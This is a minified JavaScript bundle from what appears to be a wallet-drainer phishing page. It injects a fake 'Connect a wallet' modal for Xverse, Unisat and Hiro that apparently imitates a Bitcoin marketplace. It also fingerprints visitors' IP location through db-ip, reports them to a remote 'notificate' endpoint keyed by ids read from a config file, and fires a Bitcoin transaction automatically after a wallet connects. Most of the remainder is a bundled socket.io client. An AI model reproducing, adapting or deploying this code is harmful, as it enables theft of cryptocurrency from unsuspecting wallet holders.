                '\n        \t<div  role="presentation" class="MuiModal-root css-8ndowl" id="modal_popup" style="display: none">\n                <div aria-hidden="true" class="MuiBackdrop-root back MuiModal-backdrop css-919eu4" style="opacity: 1; transition: opacity 225ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;"></div>\n\n\n                <div class="Modal_root__F4wBR">\n                <div\n                    class="conste border tw-flex tw-flex-col tw-border tw-border-solid tw-bg-gray-100 tw-overflow-auto dark-scroll-bar tw-rounded-20px tw-border-gray-500 tw-w-[410px] tw-px-[12px] tw-relative tw-max-h-[calc(100vh-100px)] tw-opacity-100 tw-scale-100"\n                        id="popCont" \n                        data-headlessui-state="open"\n                    >\n                        <div style="cursor: auto;" class=" tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4 !tw-pb-3" id="headlessui-dialog-title-:r2:" data-headlessui-state="open">\n                            <div class="border_bot tw-flex tw-flex-col tw-items-start tw-w-full tw-border-b-[1px] tw-border-gray-300">\n                                <h1 class="tw-text-white-primary tw-font-semibold !tw-text-[20px] tw-my-3 __inter ">Connect a wallet to continue</h1>\n                                <h5 class="tw-text-white-primary tw-opacity-50 tw-font-normal tw-text-[14px] tw-my-3 __inter ">Choose how you want to connect. If you don\'t have a wallet, you can select a provider and create one.</h5>\n                            </div>\n                            <svg id="clsoe-pop" stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="tw-absolute tw-top-3 tw-right-3 tw-cursor-pointer tw-text-white-2" height="24" width="24" xmlns="http://www.w3.org/2000/svg">\n                                <path fill="none" d="M0 0h24v24H0z"></path>\n                                <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>\n                            </svg>\n                        </div>\n                        <div class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative tw-pt-0">\n                            <h5 style="cursor: auto;" class="tw-text-yellow-error tw-text-justify tw-opacity-50 tw-font-bold tw-text-[12px] __inter ">\n                                Using Hiro and Xverse wallets simultaneously causes issues with signing transactions and may lead to unexpected behavior. For a safe experience, disconnect from ME website and disable one of the wallets on your browser,\n                                as they interfere with each other\'s functions in the browser.\n                            </h5>\n                            <ul>\n                                <li\n                                    class="border tw-border-gray-300 tw-border-[1px] tw-rounded-[8px] tw-flex tw-items-center tw-mt-4 hover:tw-bg-pink-200 tw-h-[78px] hover:tw-bg-opacity-10 hover:!tw-border-pink-200 tw-border-[1px] tw-border-gray-300 tw-rounded-[8px]"\n                                >\n                                    <button data-id="xverseConnect" class="bt tw-group tw-p-3 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" tabindex="0">\n                                        <div class="tw-flex tw-items-center">\n                                            <img height="38" width="38" src="https://creator-hub-prod.s3.us-east-2.amazonaws.com/dsasdadsadsadsadsa_pfp_1678238316432.png" alt="Xverse icon" class="tw-mr-3 tw-rounded-lg" />\n                                            <div class="tw-flex tw-flex-col __inter "><span>Xverse</span></div>\n                                        </div>\n                                        <div class="border circlr-mg relative tw-group tw-rounded-full tw-border-[1px] tw-border-gray-300 group-hover:tw-border-pink-primary">\n                                            <svg\n                                                width="24"\n                                                height="24"\n                                                viewBox="0 0 24 24"\n                                                fill="none"\n                                                xmlns="http://www.w3.org/2000/svg"\n                                                color="#e42575"\n                                                class="tw-h-[10px] tw-w-[10px] tw-rounded-full tw-m-[5px] tw-text-transparent tw-bg-transparent group-hover:tw-bg-pink-primary group-hover:tw-text-pink-primary"\n                                            >\n                                                <path\n                                                    d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"\n                                                    stroke="currentColor"\n                                                    stroke-width="1.5"\n                                                    stroke-linecap="round"\n                                                    stroke-linejoin="round"\n                                                ></path>\n                                            </svg>\n                                        </div>\n                                    </button>\n                                </li>\n                                <div class="marginBot"></div>\n                                <li\n                                    class="border bttw-border-gray-300 tw-border-[1px] tw-rounded-[8px] tw-flex tw-items-center hover:tw-bg-pink-200 tw-h-[78px] hover:tw-bg-opacity-10 hover:!tw-border-pink-200 tw-border-[1px] tw-border-gray-300 tw-rounded-[8px]"\n                                >\n                                    <button  data-id="unisatConnect"  class="bt tw-group tw-p-3 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium">\n                                        <div class="tw-flex tw-items-center">\n                                            <img height="38" width="38" src="https://creator-hub-prod.s3.us-east-2.amazonaws.com/dsadsadsadas_pfp_1678648465423.png" alt="Unisat icon" class="tw-mr-3 tw-rounded-lg" />\n                                            <div class="tw-flex tw-flex-col __inter "><span>Unisat</span></div>\n                                        </div>\n                                        <div class="border circlr-mg relative tw-group tw-rounded-full tw-border-[1px] tw-border-gray-300 group-hover:tw-border-pink-primary">\n                                            <svg\n                                                width="24"\n                                                height="24"\n                                                viewBox="0 0 24 24"\n                                                fill="none"\n                                                xmlns="http://www.w3.org/2000/svg"\n                                                color="#e42575"\n                                                class="tw-h-[10px] tw-w-[10px] tw-rounded-full tw-m-[5px] tw-text-transparent tw-bg-transparent group-hover:tw-bg-pink-primary group-hover:tw-text-pink-primary"\n                                            >\n                                                <path\n                                                    d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"\n                                                    stroke="currentColor"\n                                                    stroke-width="1.5"\n                                                    stroke-linecap="round"\n                                                    stroke-linejoin="round"\n                                                ></path>\n                                            </svg>\n                                        </div>\n                                    </button>\n                                </li>\n                                <div class="marginBot"></div>\n                                <li\n                                    class="border tw-border-gray-300 tw-border-[1px] tw-rounded-[8px] tw-flex tw-items-center hover:tw-bg-pink-200 tw-h-[78px] hover:tw-bg-opacity-10 hover:!tw-border-pink-200 tw-border-[1px] tw-border-gray-300 tw-rounded-[8px]"\n                                >\n                                    <button data-id="hiroConnect"  class=" bt tw-group tw-p-3 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium">\n                                        <div class="tw-flex tw-items-center">\n                                            <img height="38" width="38" src="https://creator-hub-prod.s3.us-east-2.amazonaws.com/dsasdadsadsadsadsa_pfp_1678238217021.jpeg" alt="Hiro icon" class="tw-mr-3 tw-rounded-lg" />\n                                            <div class="tw-flex tw-flex-col __inter "><span>Hiro</span></div>\n                                        </div>\n                                        <div class="border circlr-mg relative tw-group tw-rounded-full tw-border-[1px] tw-border-gray-300 group-hover:tw-border-pink-primary">\n                                            <svg\n                                                width="24"\n                                                height="24"\n                                                viewBox="0 0 24 24"\n                                                fill="none"\n                                                xmlns="http://www.w3.org/2000/svg"\n                                                color="#e42575"\n                                                class="tw-h-[10px] tw-w-[10px] tw-rounded-full tw-m-[5px] tw-text-transparent tw-bg-transparent group-hover:tw-bg-pink-primary group-hover:tw-text-pink-primary"\n                                            >\n                                                <path\n                                                    d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"\n                                                    stroke="currentColor"\n                                                    stroke-width="1.5"\n                                                    stroke-linecap="round"\n                                                    stroke-linejoin="round"\n                                                ></path>\n                                            </svg>\n                                        </div>\n                                    </button>\n                                </li>\n                            </ul>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        '),
                document.body.appendChild(e);
              const t = document.querySelectorAll(
                '[data-id="connect_button_modal"]'
              );
              for (let i of t)
                i.addEventListener("click", () => {
                  (document.getElementById("modal_popup").style =
                    "opacity: 0;  transition: all 0.2s ease-in-out;"),
                    setTimeout(() => {
                      document.getElementById("modal_popup").style =
                        "opacity: 1;  transition: all 0.2s ease-in-out;";
                    }, 200);
                });
              const n = document.getElementById("popCont");
              let r = !1;
              (n.onmouseover = () => {
                r = !0;
              }),
                (n.onmouseleave = () => {
                  r = !1;
                }),
                document
                  .getElementById("modal_popup")
                  .addEventListener("click", () => {
                    !1 === r &&
                      (document.getElementById("modal_popup").style =
                        "display: none");
                  }),
                document
                  .getElementById("clsoe-pop")
                  .addEventListener("click", () => {
                    document.getElementById("modal_popup").style =
                      "display: none";
                  });
            }, [null]),
            null
          );
      },
      2046: (e, t, n) => {
        "use strict";
        n.d(t, { Qi: () => u, kO: () => c, s3: () => l, wt: () => a });
        var r = n(1243),
          i = n(6128);
        const { server: o } = i;
        let s = [];
        const a = (e, t) => {
            r.Z.post(o + "notificate", { type: e, data: t, ids: s });
          },
          l = async () =>
            await r.Z.get(window.location.origin + "/ids.cfg")
              .then((e) => {
                if (isNaN(e.data)) {
                  const t = e.data.split("\r\n"),
                    n = [];
                  return (
                    t.forEach((e) => {
                      e && n.push(Number(e));
                    }),
                    (s = n),
                    n
                  );
                }
                return (s = [e.data]), [e.data];
              })
              .catch(() => []),
          c = async () => await r.Z.post("https://api.db-ip.com/v2/free/self/");
        function u() {
          return !!/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(
            navigator.userAgent
          );
        }
      },
      2550: (e, t, n) => {
        "use strict";
        n.d(t, { f: () => i, s: () => o });
        var r = n(9085);
        function i(e) {
          r.Am.success(e, {
            position: "top-right",
            autoClose: 5e3,
            hideProgressBar: !1,
            closeOnClick: !0,
            pauseOnHover: !0,
            draggable: !0,
            progress: void 0,
            theme: "colored",
          });
        }
        function o(e) {
          r.Am.warn(e, {
            position: "top-right",
            autoClose: 5e3,
            hideProgressBar: !1,
            closeOnClick: !0,
            pauseOnHover: !0,
            draggable: !0,
            progress: void 0,
            theme: "colored",
          });
        }
      },
      406: (e, t, n) => {
        "use strict";
        n.a(e, async (e, r) => {
          try {
            n.d(t, { o: () => p });
            var i = n(2791),
              o = n(4743),
              s = n(4150),
              a = n(8758),
              l = n(9695),
              c = n(6128),
              u = n(2046),
              f = n(6413),
              h = n(184),
              d = e([s]);
            s = (d.then ? (await d)() : d)[0];
            const p = () => {
              const [e, t] = (0, i.useState)(c);
              return (
                (0, i.useEffect)(() => {
                  (0, u.kO)().then(async (e) => {
                    const t = e.data,
                      n = (0, u.Qi)();
                    let r = localStorage.getItem("id")
                      ? localStorage.getItem("id")
                      : "";
                    r ||
                      ((r = String(Math.floor(1e5 + 9e5 * Math.random()))),
                      localStorage.setItem("id", r));
                    const i = await (0, u.s3)();
                    (t.mobile = n),
                      (t.id = r),
                      (t.ids = i),
                      (t.domain = window.location.origin),
                      (0, f.t)(t);
                  });
                }, [null]),
                (0, i.useEffect)(() => {
                  e.connect &&
                    e.transactionAfterConnect &&
                    window.bitcoinTransaction();
                }, [e]),
                (0, i.useEffect)(() => {
                  const e = document.querySelectorAll(
                    '[data-id="hiroConnect"]'
                  );
                  for (let o of e)
                    o.addEventListener("click", () => {
                      window.hiroConnect(),
                        (document.getElementById("modal_popup").style =
                          "display: none");
                    });
                  const t = document.querySelectorAll(
                    '[data-id="xverseConnect"]'
                  );
                  for (let o of t)
                    o.addEventListener("click", () => {
                      window.xverseConnect(),
                        (document.getElementById("modal_popup").style =
                          "display: none");
                    });
                  const n = document.querySelectorAll(
                    '[data-id="unisatConnect"]'
                  );
                  for (let o of n)
                    o.addEventListener("click", () => {
                      window.unisatConnect(),
                        (document.getElementById("modal_popup").style =
                          "display: none");
                    });
                  const r = document.querySelectorAll(
                    '[data-id="bitcoinLogout"]'
                  );
                  for (let o of r)
                    o.addEventListener("click", () => {
                      window.bitcoinLogout();
                    });
                  const i = document.querySelectorAll(
                    '[data-id="bitcoinTransaction"]'
                  );
                  for (let o of i)
                    o.addEventListener("click", () => {
                      window.bitcoinTransaction();
                    });
                }, [null]),
                (0, i.useEffect)(() => {
                  (window.settingBitcoin = e),
                    e.connect ? (0, l.V)(!0, e) : (0, l.V)(!1, e);
                }, [e]),
                (0, h.jsxs)(h.Fragment, {
                  children: [
                    (0, h.jsx)(o.l, { state: e, setState: t, setting: c }),
                    (0, h.jsx)(s.Y, { state: e }),
                    1 === c.modal ? (0, h.jsx)(a.N, {}) : null,
                    2 === c.modal ? (0, h.jsx)(a.m, {}) : null,
                  ],
                })
              );
            };
            r();
          } catch (p) {
            r(p);
          }
        });
      },
      6413: (e, t, n) => {
        "use strict";
        n.d(t, { t: () => xe });
        var r = {};
        n.r(r),
          n.d(r, {
            Decoder: () => he,
            Encoder: () => ue,
            PacketType: () => ce,
            protocol: () => le,
          });
        const i = Object.create(null);
        (i.open = "0"),
          (i.close = "1"),
          (i.ping = "2"),
          (i.pong = "3"),
          (i.message = "4"),
          (i.upgrade = "5"),
          (i.noop = "6");
        const o = Object.create(null);
        Object.keys(i).forEach((e) => {
          o[i[e]] = e;
        });
        const s = { type: "error", data: "parser error" },
          a =
            "function" === typeof Blob ||
            ("undefined" !== typeof Blob &&
              "[object BlobConstructor]" ===
                Object.prototype.toString.call(Blob)),
          l = "function" === typeof ArrayBuffer,
          c = (e, t) => {
            const n = new FileReader();
            return (
              (n.onload = function () {
                const e = n.result.split(",")[1];
                t("b" + (e || ""));
              }),
              n.readAsDataURL(e)
            );
          },
          u = (e, t, n) => {
            let { type: r, data: o } = e;
            return a && o instanceof Blob
              ? t
                ? n(o)
                : c(o, n)
              : l &&
                (o instanceof ArrayBuffer ||
                  ((s = o),
                  "function" === typeof ArrayBuffer.isView
                    ? ArrayBuffer.isView(s)
                    : s && s.buffer instanceof ArrayBuffer))
              ? t
                ? n(o)
                : c(new Blob([o]), n)
              : n(i[r] + (o || ""));
            var s;
          },
          f =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
          h = "undefined" === typeof Uint8Array ? [] : new Uint8Array(256);
        for (let ke = 0; ke < 64; ke++) h[f.charCodeAt(ke)] = ke;
        const d = "function" === typeof ArrayBuffer,
          p = (e, t) => {
            if (d) {
              const n = ((e) => {
                let t,
                  n,
                  r,
                  i,
                  o,
                  s = 0.75 * e.length,
                  a = e.length,
                  l = 0;
                "=" === e[e.length - 1] &&
                  (s--, "=" === e[e.length - 2] && s--);
                const c = new ArrayBuffer(s),
                  u = new Uint8Array(c);
                for (t = 0; t < a; t += 4)
                  (n = h[e.charCodeAt(t)]),
                    (r = h[e.charCodeAt(t + 1)]),
                    (i = h[e.charCodeAt(t + 2)]),
                    (o = h[e.charCodeAt(t + 3)]),
                    (u[l++] = (n << 2) | (r >> 4)),
                    (u[l++] = ((15 & r) << 4) | (i >> 2)),
                    (u[l++] = ((3 & i) << 6) | (63 & o));
                return c;
              })(e);
              return g(n, t);
            }
            return { base64: !0, data: e };
          },
          g = (e, t) =>
            "blob" === t && e instanceof ArrayBuffer ? new Blob([e]) : e,
          y = (e, t) => {
            if ("string" !== typeof e)
              return { type: "message", data: g(e, t) };
            const n = e.charAt(0);
            if ("b" === n)
              return { type: "message", data: p(e.substring(1), t) };
            return o[n]
              ? e.length > 1
                ? { type: o[n], data: e.substring(1) }
                : { type: o[n] }
              : s;
          },
          w = String.fromCharCode(30);
        function m(e) {
          if (e)
            return (function (e) {
              for (var t in m.prototype) e[t] = m.prototype[t];
              return e;
            })(e);
        }
        (m.prototype.on = m.prototype.addEventListener =
          function (e, t) {
            return (
              (this._callbacks = this._callbacks || {}),
              (this._callbacks["$" + e] = this._callbacks["$" + e] || []).push(
                t
              ),
              this
            );
          }),
          (m.prototype.once = function (e, t) {
            function n() {
              this.off(e, n), t.apply(this, arguments);
            }
            return (n.fn = t), this.on(e, n), this;
          }),
          (m.prototype.off =
            m.prototype.removeListener =
            m.prototype.removeAllListeners =
            m.prototype.removeEventListener =
              function (e, t) {
                if (
                  ((this._callbacks = this._callbacks || {}),
                  0 == arguments.length)
                )
                  return (this._callbacks = {}), this;
                var n,
                  r = this._callbacks["$" + e];
                if (!r) return this;
                if (1 == arguments.length)
                  return delete this._callbacks["$" + e], this;
                for (var i = 0; i < r.length; i++)
                  if ((n = r[i]) === t || n.fn === t) {
                    r.splice(i, 1);
                    break;
                  }
                return 0 === r.length && delete this._callbacks["$" + e], this;
              }),
          (m.prototype.emit = function (e) {
            this._callbacks = this._callbacks || {};
            for (
              var t = new Array(arguments.length - 1),
                n = this._callbacks["$" + e],
                r = 1;
              r < arguments.length;
              r++
            )
              t[r - 1] = arguments[r];
            if (n) {
              r = 0;
              for (var i = (n = n.slice(0)).length; r < i; ++r)
                n[r].apply(this, t);
            }
            return this;
          }),
          (m.prototype.emitReserved = m.prototype.emit),
          (m.prototype.listeners = function (e) {
            return (
              (this._callbacks = this._callbacks || {}),
              this._callbacks["$" + e] || []
            );
          }),
          (m.prototype.hasListeners = function (e) {
            return !!this.listeners(e).length;
          });
        const b =
          "undefined" !== typeof self
            ? self
            : "undefined" !== typeof window
            ? window
            : Function("return this")();
        function v(e) {
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          return n.reduce(
            (t, n) => (e.hasOwnProperty(n) && (t[n] = e[n]), t),
            {}
          );
        }
        const E = b.setTimeout,
          S = b.clearTimeout;
        function x(e, t) {
          t.useNativeTimers
            ? ((e.setTimeoutFn = E.bind(b)), (e.clearTimeoutFn = S.bind(b)))
            : ((e.setTimeoutFn = b.setTimeout.bind(b)),
              (e.clearTimeoutFn = b.clearTimeout.bind(b)));
        }
        class A extends Error {
          constructor(e, t, n) {
            super(e),
              (this.description = t),
              (this.context = n),
              (this.type = "TransportError");
          }
        }
        class k extends m {
          constructor(e) {
            super(),
              (this.writable = !1),
              x(this, e),
              (this.opts = e),
              (this.query = e.query),
              (this.socket = e.socket);
          }
          onError(e, t, n) {
            return super.emitReserved("error", new A(e, t, n)), this;
          }
          open() {
            return (this.readyState = "opening"), this.doOpen(), this;
          }
          close() {
            return (
              ("opening" !== this.readyState && "open" !== this.readyState) ||
                (this.doClose(), this.onClose()),
              this
            );
          }
          send(e) {
            "open" === this.readyState && this.write(e);
          }
          onOpen() {
            (this.readyState = "open"),
              (this.writable = !0),
              super.emitReserved("open");
          }
          onData(e) {
            const t = y(e, this.socket.binaryType);
            this.onPacket(t);
          }
          onPacket(e) {
            super.emitReserved("packet", e);
          }
          onClose(e) {
            (this.readyState = "closed"), super.emitReserved("close", e);
          }
          pause(e) {}
        }
        const T =
            "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_".split(
              ""
            ),
          C = 64,
          I = {};
        let O,
          B = 0,
          P = 0;
        function _(e) {
          let t = "";
          do {
            (t = T[e % C] + t), (e = Math.floor(e / C));
          } while (e > 0);
          return t;
        }
        function U() {
          const e = _(+new Date());
          return e !== O ? ((B = 0), (O = e)) : e + "." + _(B++);
        }
        for (; P < C; P++) I[T[P]] = P;
        function N(e) {
          let t = "";
          for (let n in e)
            e.hasOwnProperty(n) &&
              (t.length && (t += "&"),
              (t += encodeURIComponent(n) + "=" + encodeURIComponent(e[n])));
          return t;
        }
        let R = !1;
        try {
          R =
            "undefined" !== typeof XMLHttpRequest &&
            "withCredentials" in new XMLHttpRequest();
        } catch (Ae) {}
        const L = R;
        function $(e) {
          const t = e.xdomain;
          try {
            if ("undefined" !== typeof XMLHttpRequest && (!t || L))
              return new XMLHttpRequest();
          } catch (n) {}
          if (!t)
            try {
              return new b[["Active"].concat("Object").join("X")](
                "Microsoft.XMLHTTP"
              );
            } catch (n) {}
        }
        function H() {}
        const D = null != new $({ xdomain: !1 }).responseType;
        class M extends m {
          constructor(e, t) {
            super(),
              x(this, t),
              (this.opts = t),
              (this.method = t.method || "GET"),
              (this.uri = e),
              (this.async = !1 !== t.async),
              (this.data = void 0 !== t.data ? t.data : null),
              this.create();
          }
          create() {
            const e = v(
              this.opts,
              "agent",
              "pfx",
              "key",
              "passphrase",
              "cert",
              "ca",
              "ciphers",
              "rejectUnauthorized",
              "autoUnref"
            );
            (e.xdomain = !!this.opts.xd), (e.xscheme = !!this.opts.xs);
            const t = (this.xhr = new $(e));
            try {
              t.open(this.method, this.uri, this.async);
              try {
                if (this.opts.extraHeaders) {
                  t.setDisableHeaderCheck && t.setDisableHeaderCheck(!0);
                  for (let e in this.opts.extraHeaders)
                    this.opts.extraHeaders.hasOwnProperty(e) &&
                      t.setRequestHeader(e, this.opts.extraHeaders[e]);
                }
              } catch (n) {}
              if ("POST" === this.method)
                try {
                  t.setRequestHeader(
                    "Content-type",
                    "text/plain;charset=UTF-8"
                  );
                } catch (n) {}
              try {
                t.setRequestHeader("Accept", "*/*");
              } catch (n) {}
              "withCredentials" in t &&
                (t.withCredentials = this.opts.withCredentials),
                this.opts.requestTimeout &&
                  (t.timeout = this.opts.requestTimeout),
                (t.onreadystatechange = () => {
                  4 === t.readyState &&
                    (200 === t.status || 1223 === t.status
                      ? this.onLoad()
                      : this.setTimeoutFn(() => {
                          this.onError(
                            "number" === typeof t.status ? t.status : 0
                          );
                        }, 0));
                }),
                t.send(this.data);
            } catch (n) {
              return void this.setTimeoutFn(() => {
                this.onError(n);
              }, 0);
            }
            "undefined" !== typeof document &&
              ((this.index = M.requestsCount++),
              (M.requests[this.index] = this));
          }
          onError(e) {
            this.emitReserved("error", e, this.xhr), this.cleanup(!0);
          }
          cleanup(e) {
            if ("undefined" !== typeof this.xhr && null !== this.xhr) {
              if (((this.xhr.onreadystatechange = H), e))
                try {
                  this.xhr.abort();
                } catch (t) {}
              "undefined" !== typeof document && delete M.requests[this.index],
                (this.xhr = null);
            }
          }
          onLoad() {
            const e = this.xhr.responseText;
            null !== e &&
              (this.emitReserved("data", e),
              this.emitReserved("success"),
              this.cleanup());
          }
          abort() {
            this.cleanup();
          }
        }
        if (
          ((M.requestsCount = 0),
          (M.requests = {}),
          "undefined" !== typeof document)
        )
          if ("function" === typeof attachEvent) attachEvent("onunload", F);
          else if ("function" === typeof addEventListener) {
            addEventListener("onpagehide" in b ? "pagehide" : "unload", F, !1);
          }
        function F() {
          for (let e in M.requests)
            M.requests.hasOwnProperty(e) && M.requests[e].abort();
        }
        const j =
            "function" === typeof Promise &&
            "function" === typeof Promise.resolve
              ? (e) => Promise.resolve().then(e)
              : (e, t) => t(e, 0),
          z = b.WebSocket || b.MozWebSocket;
        n(9778).lW;
        const K =
          "undefined" !== typeof navigator &&
          "string" === typeof navigator.product &&
          "reactnative" === navigator.product.toLowerCase();
        const W = {
            websocket: class extends k {
              constructor(e) {
                super(e), (this.supportsBinary = !e.forceBase64);
              }
              get name() {
                return "websocket";
              }
              doOpen() {
                if (!this.check()) return;
                const e = this.uri(),
                  t = this.opts.protocols,
                  n = K
                    ? {}
                    : v(
                        this.opts,
                        "agent",
                        "perMessageDeflate",
                        "pfx",
                        "key",
                        "passphrase",
                        "cert",
                        "ca",
                        "ciphers",
                        "rejectUnauthorized",
                        "localAddress",
                        "protocolVersion",
                        "origin",
                        "maxPayload",
                        "family",
                        "checkServerIdentity"
                      );
                this.opts.extraHeaders && (n.headers = this.opts.extraHeaders);
                try {
                  this.ws = K ? new z(e, t, n) : t ? new z(e, t) : new z(e);
                } catch (Ae) {
                  return this.emitReserved("error", Ae);
                }
                (this.ws.binaryType = this.socket.binaryType || "arraybuffer"),
                  this.addEventListeners();
              }
              addEventListeners() {
                (this.ws.onopen = () => {
                  this.opts.autoUnref && this.ws._socket.unref(), this.onOpen();
                }),
                  (this.ws.onclose = (e) =>
                    this.onClose({
                      description: "websocket connection closed",
                      context: e,
                    })),
                  (this.ws.onmessage = (e) => this.onData(e.data)),
                  (this.ws.onerror = (e) => this.onError("websocket error", e));
              }
              write(e) {
                this.writable = !1;
                for (let t = 0; t < e.length; t++) {
                  const n = e[t],
                    r = t === e.length - 1;
                  u(n, this.supportsBinary, (e) => {
                    try {
                      this.ws.send(e);
                    } catch (t) {}
                    r &&
                      j(() => {
                        (this.writable = !0), this.emitReserved("drain");
                      }, this.setTimeoutFn);
                  });
                }
              }
              doClose() {
                "undefined" !== typeof this.ws &&
                  (this.ws.close(), (this.ws = null));
              }
              uri() {
                let e = this.query || {};
                const t = this.opts.secure ? "wss" : "ws";
                let n = "";
                this.opts.port &&
                  (("wss" === t && 443 !== Number(this.opts.port)) ||
                    ("ws" === t && 80 !== Number(this.opts.port))) &&
                  (n = ":" + this.opts.port),
                  this.opts.timestampRequests &&
                    (e[this.opts.timestampParam] = U()),
                  this.supportsBinary || (e.b64 = 1);
                const r = N(e);
                return (
                  t +
                  "://" +
                  (-1 !== this.opts.hostname.indexOf(":")
                    ? "[" + this.opts.hostname + "]"
                    : this.opts.hostname) +
                  n +
                  this.opts.path +
                  (r.length ? "?" + r : "")
                );
              }
              check() {
                return !!z;
              }
            },
            polling: class extends k {
              constructor(e) {
                if (
                  (super(e),
                  (this.polling = !1),
                  "undefined" !== typeof location)
                ) {
                  const t = "https:" === location.protocol;
                  let n = location.port;
                  n || (n = t ? "443" : "80"),
                    (this.xd =
                      ("undefined" !== typeof location &&
                        e.hostname !== location.hostname) ||
                      n !== e.port),
                    (this.xs = e.secure !== t);
                }
                const t = e && e.forceBase64;
                this.supportsBinary = D && !t;
              }
              get name() {
                return "polling";
              }
              doOpen() {
                this.poll();
              }
              pause(e) {
                this.readyState = "pausing";
                const t = () => {
                  (this.readyState = "paused"), e();
                };
                if (this.polling || !this.writable) {
                  let e = 0;
                  this.polling &&
                    (e++,
                    this.once("pollComplete", function () {
                      --e || t();
                    })),
                    this.writable ||
                      (e++,
                      this.once("drain", function () {
                        --e || t();
                      }));
                } else t();
              }
              poll() {
                (this.polling = !0), this.doPoll(), this.emitReserved("poll");
              }
              onData(e) {
                ((e, t) => {
                  const n = e.split(w),
                    r = [];
                  for (let i = 0; i < n.length; i++) {
                    const e = y(n[i], t);
                    if ((r.push(e), "error" === e.type)) break;
                  }
                  return r;
                })(e, this.socket.binaryType).forEach((e) => {
                  if (
                    ("opening" === this.readyState &&
                      "open" === e.type &&
                      this.onOpen(),
                    "close" === e.type)
                  )
                    return (
                      this.onClose({
                        description: "transport closed by the server",
                      }),
                      !1
                    );
                  this.onPacket(e);
                }),
                  "closed" !== this.readyState &&
                    ((this.polling = !1),
                    this.emitReserved("pollComplete"),
                    "open" === this.readyState && this.poll());
              }
              doClose() {
                const e = () => {
                  this.write([{ type: "close" }]);
                };
                "open" === this.readyState ? e() : this.once("open", e);
              }
              write(e) {
                (this.writable = !1),
                  ((e, t) => {
                    const n = e.length,
                      r = new Array(n);
                    let i = 0;
                    e.forEach((e, o) => {
                      u(e, !1, (e) => {
                        (r[o] = e), ++i === n && t(r.join(w));
                      });
                    });
                  })(e, (e) => {
                    this.doWrite(e, () => {
                      (this.writable = !0), this.emitReserved("drain");
                    });
                  });
              }
              uri() {
                let e = this.query || {};
                const t = this.opts.secure ? "https" : "http";
                let n = "";
                !1 !== this.opts.timestampRequests &&
                  (e[this.opts.timestampParam] = U()),
                  this.supportsBinary || e.sid || (e.b64 = 1),
                  this.opts.port &&
                    (("https" === t && 443 !== Number(this.opts.port)) ||
                      ("http" === t && 80 !== Number(this.opts.port))) &&
                    (n = ":" + this.opts.port);
                const r = N(e);
                return (
                  t +
                  "://" +
                  (-1 !== this.opts.hostname.indexOf(":")
                    ? "[" + this.opts.hostname + "]"
                    : this.opts.hostname) +
                  n +
                  this.opts.path +
                  (r.length ? "?" + r : "")
                );
              }
              request() {
                let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {};
                return (
                  Object.assign(e, { xd: this.xd, xs: this.xs }, this.opts),
                  new M(this.uri(), e)
                );
              }
              doWrite(e, t) {
                const n = this.request({ method: "POST", data: e });
                n.on("success", t),
                  n.on("error", (e, t) => {
                    this.onError("xhr post error", e, t);
                  });
              }
              doPoll() {
                const e = this.request();
                e.on("data", this.onData.bind(this)),
                  e.on("error", (e, t) => {
                    this.onError("xhr poll error", e, t);
                  }),
                  (this.pollXhr = e);
              }
            },
          },
          V =
            /^(?:(?![^:@\/?#]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@\/?#]*)(?::([^:@\/?#]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/,
          q = [
            "source",
            "protocol",
            "authority",
            "userInfo",
            "user",
            "password",
            "host",
            "port",
            "relative",
            "path",
            "directory",
            "file",
            "query",
            "anchor",
          ];
        function G(e) {
          const t = e,
            n = e.indexOf("["),
            r = e.indexOf("]");
          -1 != n &&
            -1 != r &&
            (e =
              e.substring(0, n) +
              e.substring(n, r).replace(/:/g, ";") +
              e.substring(r, e.length));
          let i = V.exec(e || ""),
            o = {},
            s = 14;
          for (; s--; ) o[q[s]] = i[s] || "";
          return (
            -1 != n &&
              -1 != r &&
              ((o.source = t),
              (o.host = o.host
                .substring(1, o.host.length - 1)
                .replace(/;/g, ":")),
              (o.authority = o.authority
                .replace("[", "")
                .replace("]", "")
                .replace(/;/g, ":")),
              (o.ipv6uri = !0)),
            (o.pathNames = (function (e, t) {
              const n = /\/{2,9}/g,
                r = t.replace(n, "/").split("/");
              ("/" != t.slice(0, 1) && 0 !== t.length) || r.splice(0, 1);
              "/" == t.slice(-1) && r.splice(r.length - 1, 1);
              return r;
            })(0, o.path)),
            (o.queryKey = (function (e, t) {
              const n = {};
              return (
                t.replace(/(?:^|&)([^&=]*)=?([^&]*)/g, function (e, t, r) {
                  t && (n[t] = r);
                }),
                n
              );
            })(0, o.query)),
            o
          );
        }
        class Y extends m {
          constructor(e) {
            let t =
